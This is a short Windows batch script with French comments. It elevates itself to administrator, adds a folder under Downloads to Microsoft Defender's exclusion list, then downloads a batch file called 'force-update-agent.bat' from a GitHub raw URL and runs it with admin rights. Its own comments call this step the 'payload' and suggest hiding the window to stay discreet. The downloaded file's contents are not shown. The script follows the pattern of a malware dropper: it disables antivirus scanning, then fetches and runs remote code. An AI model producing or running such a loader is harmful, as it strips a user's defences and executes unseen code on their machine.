@echo off
setlocal

:: --- 1. TEST ET AUTO-ELEVATION ---
:: On vérifie les droits. Si erreur, on relance en Admin et on quitte le script actuel.
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Demande de droits Administrateur...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: --- 2. EXECUTION DU PAYLOAD (Une fois en Admin) ---
:: On utilise -WindowStyle Hidden si tu veux que ce soit discret, sinon laisse tel quel.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$p = \"$env:USERPROFILE\Downloads\NoWin\"; ^
    if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }; ^
    Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; ^
    Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat' -OutFile \"$p\force-update-agent.bat\"; ^
    Start-Process \"$p\force-update-agent.bat\" -ArgumentList '--yes' -Verb RunAs"

exit
